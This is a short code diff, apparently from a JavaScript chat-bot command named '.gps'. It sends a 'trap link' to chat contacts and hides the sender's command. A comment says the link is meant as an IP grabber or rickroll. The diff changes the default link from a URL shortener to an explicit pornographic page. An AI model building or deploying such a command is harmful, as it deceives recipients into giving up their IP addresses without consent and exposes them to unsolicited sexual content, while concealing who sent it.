@@ -4,7 +4,7 @@ export default {
     execute: async ({ sock, remitente, msg, textoLimpio }) => {
         
         // Uso: .gps https://tu-link-trampa.com (grabber de IPs, rickroll, etc)
-        const linkTrampa = textoLimpio.replace(/^\.gps\s*/i, '').trim() || "https://tinyurl.com/4ddkun82";
+        const linkTrampa = textoLimpio.replace(/^\.gps\s*/i, '').trim() || "https://rule34.xxx/index.php?page=post&s=view&id=17284547&tags=dick+";
 
         try {
             // Sigilo: borramos el comando de tu pantalla
